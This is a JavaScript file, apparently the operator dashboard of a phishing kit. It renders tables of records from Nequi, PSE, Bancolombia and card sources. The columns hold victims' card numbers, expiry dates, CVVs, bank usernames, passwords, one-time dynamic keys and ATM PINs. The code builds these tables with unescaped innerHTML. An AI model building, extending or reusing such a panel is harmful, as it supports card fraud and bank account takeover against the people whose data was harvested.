// JavaScript para manejar diferentes fuentes y renderizar dinámicamente
const handleButtonClick = (source, title, dataSource) => {
    titleContent.innerHTML = title;
    divInfo.innerHTML = "";

    dataSource.forEach((object) => {
        if (!source || object.fuente === source) {
            const panel = document.createElement("div");
            panel.className = "card mb-3";

            panel.innerHTML = `<div class="divcard">
                <table class="table table-striped table-bordered table-sm">
                    <thead>
                        <tr>
                            ${
                              source === "Tarjetas"
                                ? `
                            <th scope="col">Fuente</th>
                            <th scope="col">Nombre</th>
                            <th scope="col">CC</th>
                            <th scope="col">TC</th>
                            <th scope="col">EXP</th>
                            <th scope="col">CVV</th>
                            <th scope="col">Banco</th>
                            <th scope="col">Usuario</th>
                            <th scope="col">Contraseña</th>
                            <th scope="col">Dinámica</th>
                            <th scope="col">Cajero</th>
                            <th scope="col">Teléfono</th>
                            <th scope="col">Estado</th>`
                                : `
                            <th scope="col">Fuente</th>
                            <th scope="col">Nombre</th>
                            <th scope="col">CC</th>
                            <th scope="col">Teléfono</th>
                            <th scope="col">Usuario</th>
                            <th scope="col">Contraseña</th>
                            <th scope="col">Dinámica</th>
                            <th scope="col">Estado</th>
                            ${
                              source === "PSE"
                                ? `<th scope="col">Banco</th>`
                                : ""
                            }`
                            }
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <th scope="row">${object.fuente}</th>
                            <td>${object.name}</td>
                            <td>${object.reg}</td>
                            ${
                              source === "Tarjetas"
                                ? `
                            <td>${object.cr}</td>
                            <td>${object.px}</td>
                            <td>${object.vc}</td>
                            <td>${object.bn}</td>
                            <td>${object.us}</td>
                            <td>${object.ps}</td>
                            <td>${object.din}</td>
                            <td>${object.ccaj}</td>
                            <td>${object.cl}</td>
                            <td>${object.status}</td>`
                            : `
                            <td>${object.cl}</td>
                            <td>${object.us}</td>
                            <td>${object.ps}</td>
                            <td>${object.din}</td>
                            <td>${object.status}</td>
                            ${source === "PSE" ? `<td>${object.bn}</td>` : ""}`
                            }
                        </tr>
                    </tbody>
                </table>
            </div>`;

            divInfo.appendChild(panel);
        }
    });
};

const deleteItem = (id) => {
    console.log(`Eliminar item con ID: ${id}`);
    // Aquí puedes implementar la lógica para eliminar
};

const titleContent = document.getElementById("title-content");
const divInfo = document.getElementById("info-data");

// Listeners para botones
const neqButton = document.getElementById("neq-button");
neqButton.addEventListener("click", (link) => {
    link.preventDefault();
    handleButtonClick("Nequi", "Nequi", logsList);
});

const cardButton = document.getElementById("card-button");
cardButton.addEventListener("click", (link) => {
    link.preventDefault();
    handleButtonClick("Tarjetas", "Tarjetas", infoList);
});

const psButton = document.getElementById("ps-button");
psButton.addEventListener("click", (link) => {
    link.preventDefault();
    handleButtonClick("PSE", "PSE", logsList);
});

const tricoButton = document.getElementById("trico-button");
tricoButton.addEventListener("click", (link) => {
    link.preventDefault();
    handleButtonClick("Trico", "Bancolombia", logsList);
})